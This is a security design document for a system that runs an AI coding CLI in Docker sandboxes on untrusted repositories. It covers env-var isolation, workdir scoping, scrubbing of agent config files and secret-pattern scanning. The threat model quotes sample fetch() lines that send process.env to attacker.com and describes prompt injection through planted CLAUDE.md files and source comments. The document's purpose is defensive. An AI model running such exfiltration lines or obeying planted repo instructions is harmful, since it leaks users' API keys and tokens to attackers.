# Security: env-var isolation, workdir scoping & sandbox containment

The assignment requires "isolate AI CLI runs; secure tokens and
secrets." This document spells out how the running system enforces
that, what threat model it addresses, and what follow-ups are needed
for production-grade guarantees.

## TL;DR — three layers of containment

| Layer | What's isolated | Where it's broken (intentionally) |
|---|---|---|
| **Process / env** | Each phase (install, AI, validation) runs in a fresh Docker container with an explicitly constructed env array. The attacker's process is dead before the AI key ever exists in any env var | Nothing — this layer is fully isolated |
| **Workdir / filesystem** | Each job and each repo gets its own host workdir; no two jobs share a workdir, and no two repos share a workdir | The three containers within a single job share the workdir bind-mount. A malicious `postinstall` from container #1 leaves files visible to container #2 (the AI). This is intentional — the AI needs to see the project — but it's a real prompt-injection vector. Mitigated by pre-AI scrubbing + post-AI secret scanning, documented below |
| **Sandbox image / capabilities** | Sandbox runs as `node` (uid 1000) with default capabilities only. Docker socket is **not** mounted into the sandbox | A Docker/runc CVE bypasses this. Out of scope for v1 (sysbox/gVisor is the production answer) |

## Threat model

The hostile actor is **a target repository** the system clones and
processes. Concretely:

- Its `package.json` may contain a `postinstall` script.
- Its Jest setup file (`jest.config.*`, `setupFilesAfterEach`) executes
  Node code in the sandbox.
- Its test cases run user-controlled code as part of the
  coverage-baseline + validation phases.

Any of those can do `console.log(process.env)` or
`fetch('https://attacker.com/?leak=' + JSON.stringify(process.env))`.
A naive design that inherits the backend's `process.env` into the
sandbox would leak `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` on every
analyze.

**This system does not inherit env from the backend's `process.env`
into any sandbox.** Each sandbox container is spawned with an
explicitly constructed env array, scoped to the minimum that phase
needs.

## Per-phase env injection

Sandbox containers are spawned **fresh per phase** with the env array
explicitly constructed by the backend (see
`backend/src/infrastructure/sandbox/DockerSandbox.ts:65-73`):

```ts
const envArr = Object.entries(input.env ?? {}).map(([k, v]) => `${k}=${v}`);
const container = await this.docker.createContainer({
  Image: this.image,
  Cmd: input.cmd,
  Env: envArr,             // ← only what the caller passed
  WorkingDir: '/workspace',
  …
});
```

There is **no** call to anything resembling `process.env` here. The
container starts with whatever env array the caller built; nothing
inherits.

What each call site passes:

| Phase | Caller | Env injected |
|---|---|---|
| Container #1: install + run tests (baseline coverage) | `NpmTestRunner.run()` | **No `env` field at all** → empty user-env. The sandbox base image's defaults (PATH etc.) are all the process sees |
| Container #2: AI invocation | `ClaudeCodeAdapter.generateTest()` | `{ ANTHROPIC_API_KEY }` (and `ANTHROPIC_BASE_URL` if optionally set). Resolved by `resolveAiEnv(adapter.requiredEnv, adapter.optionalEnv, processEnv)` — only the adapter-declared keys are extracted from `process.env` and forwarded |
| Container #3: re-run install + tests (post-AI validation) | `NpmTestRunner.run()` | Same as #1 — no AI key |

A `postinstall` script running in container #1 sees a `process.env`
that **does not contain `ANTHROPIC_API_KEY` nor `GITHUB_TOKEN`**. It
cannot exfiltrate them because they were never injected.

## Why GITHUB_TOKEN never enters any sandbox

Cloning happens on the **host** via simple-git, which embeds the PAT in
the HTTPS clone URL transiently for the network handshake. The cloned
files in the workdir contain no token references — git's standard
clone behavior wipes the URL after the fetch. The sandbox sees the
unpacked source files but never the network traffic that delivered
them, never the PAT.

Similarly, pushing the AI's branch back to the bot's fork happens on
the host via simple-git, after the sandbox containers have all exited.
The PAT lives only in the backend process's `process.env`, never in a
sandbox container's env.

## Why ANTHROPIC_API_KEY is contained

The key is injected into container #2 only — the AI invocation phase.
That container's command line is `claude -p <prompt>`. **No `npm
install` runs in this container; no `package.json` script executes.**
The malicious target repo's `postinstall` therefore has no opportunity
to run while the key is in the environment.

If a malicious repo could trick the AI itself into echoing `process.env`
to the model, the prompt machinery would still need to ship those tokens
out of the container. Claude Code's behavior is to write files to the
workdir; its prompt context does not include `process.env`. A
defense-in-depth follow-up worth doing is filtering the AI's
tool-use stream for any pattern matching `sk-ant-…` or `ghp_…` before
logs are persisted, but a malicious target repo cannot directly observe
these env vars under the current design.

## Process-level isolation between phases

Each per-job sandbox container is destroyed at phase end. The flow is
literally three independent containers spawned, run, removed:

| Phase | Caller | Container lifecycle |
|---|---|---|
| 1. Baseline install + test | `NpmTestRunner.run()` | `dockerode.createContainer` → `start` → `wait` → **`remove({ force: true })`** |
| 2. AI invocation | `ClaudeCodeAdapter.generateTest()` | A **fresh** container — same image, separate Linux process, separate PID/mount namespace, separate `process.env` |
| 3. Validation install + test | `NpmTestRunner.run()` again | Another fresh container |

The attacker's `postinstall` script runs **inside container #1** as a
process. When that container is destroyed, that process is dead. There
is no `/proc/<pid>/environ` for container #2 to read, no shared memory,
no IPC channel. **The attacker's process never coexists with
`ANTHROPIC_API_KEY`** because the AI key is only injected into
container #2's env array.

## Workdir isolation between jobs and repos

Workdir paths are constructed deterministically and per-job:

| Use case | Workdir path | Scope |
|---|---|---|
| `AnalyzeRepositoryCoverage` | `${jobWorkdirRoot}/analyze-${repo.id}` | Per repository |
| `RunImprovementJob` | `${jobWorkdirRoot}/job-${job.id}` | Per job (UUID) — never reused |

Each `sandbox.run()` bind-mounts only one workdir into `/workspace`:

```ts
HostConfig: {
  Binds: [`${input.workdir}:/workspace`],
}
```

Therefore **a sandbox container for repo A's job has no path on which
it could read or write repo B's files**. Repo B's workdir is at a
different host directory, never bind-mounted into A's container, never
in A's filesystem view.

Concrete cross-repo isolation guarantees:

- A malicious `postinstall` running in repo A's sandbox sees only
  `/workspace`, which maps to `/tmp/coverage-improver-jobs/job-<A>` on
  the host. It cannot `cat /tmp/coverage-improver-jobs/job-<B>/...` —
  that path simply doesn't exist inside its container.
- Two improvement jobs always have different workdirs, even on the
  same repo, because `job.id` is a fresh UUID per job. The per-repo
  serial queue means two jobs on the same repo don't run concurrently
  anyway, but if they ever did, they'd still be in separate
  filesystems.
- The `analyze-${repo.id}` directory is shared across re-analyses of
  the same repo (the cloner wipes + re-clones into it on each run), so
  back-to-back re-analyzes don't leak between each other beyond what
  git itself populates.

## Workdir is shared *within* a single job — and what we do about it

This is the honest distinction the earlier draft of this document
glossed over.

Within one `RunImprovementJob.execute()` call, **all three containers
bind-mount the same host workdir** at `/workspace`. That's by design:

- Container #1's `npm install` populates `node_modules/`.
- Container #2 (the AI) needs to see those modules + the source files
  to produce useful tests.
- Container #3 needs both the source and the AI's new test files to
  re-run validation.

So although the *processes* are separate, they share a filesystem.
Side effects of a malicious `postinstall` from container #1 — anything
it wrote into `/workspace` — persist into container #2's view.

**What the attacker can do with that:**
- Plant `CLAUDE.md`, `.claude/settings.json`, `.cursor/rules/...`, etc.
  Claude Code reads these as project context; they're a direct
  prompt-injection vector.
- Tamper with source files that the AI reads as "code under test" —
  including planted comments designed to instruct the model.
- Survive into container #3 the same way.

**What the attacker cannot do** (still true):
- Read `process.env` of containers #2 or #3. The env var was never
  set there.
- Read another job's workdir (different bind-mount path).
- Read the Docker socket. Not mounted in any sandbox.

So the realistic remaining risk is **prompt injection**, not direct
process-level secret theft. The two mitigations that are now wired in
the orchestrator address this:

### Mitigation 1: pre-AI agent-config scrubbing

Before the AI invocation phase, `RunImprovementJob.runOneAttempt()`
calls `AgentConfigScrubber.scrub(workdir)`
(`backend/src/application/services/AgentConfigScrubber.ts`), which removes:

- `CLAUDE.md`, `claude.md`, `CLAUDE.local.md`
- `.claude/`, `.cursor/`, `.cursorrules`, `.continue/`
- `.aider.conf.yml`, `.aider.input.history`
- `AGENTS.md`, `agents.md`

These are the agent-config files Claude Code (and other coding
assistants) auto-read when present in a project. A malicious repo can
plant them either by shipping them in the source tree or via a
`postinstall` that writes them. We scrub before *every* AI invocation,
so neither vector survives.

The scrubbing is deliberately not silent — it's logged into the job
log (`[security] scrubbed agent-config paths before AI invoke: …`) so
that an operator can see when a target repo was attempting to
influence the AI.

### Mitigation 2: post-AI secret scanning

After the AI returns, `RunImprovementJob.runOneAttempt()` scans both
the AI's logs (`aiOut.logs`) and the contents of every file the AI
wrote (`aiOut.writtenFiles`) for known secret shapes via
`SecretScanner.findIn()` (`backend/src/domain/security/SecretScanner.ts`):

| Pattern | Catches |
|---|---|
| `sk-ant-api03-…` | Anthropic API keys |
| `ghp_…` (40+ chars) | GitHub classic PATs |
| `github_pat_…` | GitHub fine-grained PATs |
| `gho_…`, `ghu_…`, `ghs_…`, `ghr_…` | Other GitHub token types |
| `AKIA…` (16 chars) | AWS access key IDs (defensive) |

If any of those match, the attempt fails with `kind: 'security'`. The
orchestrator treats `security` as **terminal** — no retry within the
mode, no sibling fallback. The job ends `failed` with a log entry like:

```
[security] suspected secret leak in src/foo.test.ts (anthropic-api-key,
prefix 'sk-ant…'); halting job to avoid pushing it upstream.
```

Crucially, **this fires BEFORE the host-side push to GitHub**. A
suspected leak never reaches a public PR.

### What these don't catch

- An attacker who plants prompt-injection in `package.json` itself, or
  in source files, or in test files. The AI may still be tricked into
  generating misbehaving tests; we'd catch it via the AST validator
  (no removed/renamed pre-existing blocks) and the tests-pass +
  coverage-delta gates, but not perfectly.
- An attacker who exfiltrates secrets via a sub-process spawned during
  test execution (e.g. a malicious `jest.setup.ts` doing
  `fetch('https://attacker.com', { body: ...lcov... })`). Test-time
  network egress is unrestricted in v1; mitigation would be a
  custom-bridge + iptables allow-list.
- An attacker who uses non-standard secret shapes we don't pattern
  for. The pattern set is intentionally conservative; raising it
  raises false-positive risk.

These are the practical limits and are documented under "What this
design does NOT protect against" below.

## What this design does NOT protect against

These are deliberate v1 trade-offs called out in the README, not gaps
that were missed:

| Risk | Why it's open | Follow-up |
|---|---|---|
| A malicious target repo whose tests intentionally call `https://attacker.com/?leak=...` from inside `it()` blocks. The sandbox's outbound network is unrestricted in v1 | Default Docker bridge networking; we don't filter egress | Custom-bridge + iptables allow-list for `registry.npmjs.org`, `api.anthropic.com`, `api.github.com`. ~30 LOC + image rebuild |
| A target repo whose tests read `/proc` or attempt container escapes | The sandbox runs as uid 1000 with no granted capabilities, but a runc/Docker CVE bypasses this | sysbox or gVisor for production untrusted workloads. Out of scope for take-home |
| Side-channel leakage via test output | Backend captures stdout/stderr verbatim into job logs. If a test accidentally prints `process.env`, it would be persisted | Add a redaction pass on log writes that masks tokens matching known shapes (`ghp_[A-Za-z0-9]{36}`, `sk-ant-[a-zA-Z0-9-]+`) |
| Docker socket mount on the backend | The backend can do anything the host docker daemon can do. This is the documented security caveat | sysbox or rootless DinD in production |

## Verifying the claim yourself

To prove env isolation experimentally:

```bash
# 1. Make sure backend has secrets in its process env. The container
#    name is "<compose-project>-backend-1" — compose derives the
#    project name from your folder name, so use `docker compose ps -q backend`
#    to look it up portably:
docker compose exec backend env | grep -E "ANTHROPIC_API_KEY|GITHUB_TOKEN"
# → both present

# 2. Spawn a sandbox with the same image NpmTestRunner uses, mimicking
#    the install phase. We pass NO env array — exactly what
#    NpmTestRunner.run() does for install/test phases.
#    On Apple Silicon, add `--platform linux/arm64` (or whatever your
#    image was built for) since `docker run` defaults to the daemon's
#    native arch which may differ from the compose-built image:
docker run --rm --user node \
  --platform $(docker image inspect coverage-improver-sandbox:latest --format '{{.Os}}/{{.Architecture}}') \
  coverage-improver-sandbox:latest \
  sh -c 'env | grep -E "^ANTHROPIC_API_KEY=|^GITHUB_TOKEN=" || echo "NEITHER PRESENT"'
# → NEITHER PRESENT
```

The sandbox container's process never sees the backend's secrets
because they were never put into its env array.

## Summary

| Secret | Where it lives | Where it never goes |
|---|---|---|
| `GITHUB_TOKEN` | Backend `process.env` only | Never enters any sandbox container |
| `ANTHROPIC_API_KEY` | Backend `process.env`; injected only into the AI-invocation sandbox container | Never enters install/test sandbox containers; never written to workdir or disk |
| Any other env var | Stays where it is unless an `AICliPort` adapter declares it as `requiredEnv` | Adapter declarations are statically auditable |

The principle is **least privilege at every phase boundary**: each
sandbox container gets only the env vars it actually needs, and the
phase that runs untrusted target-repo code (containers #1 and #3)
gets none of the secrets.
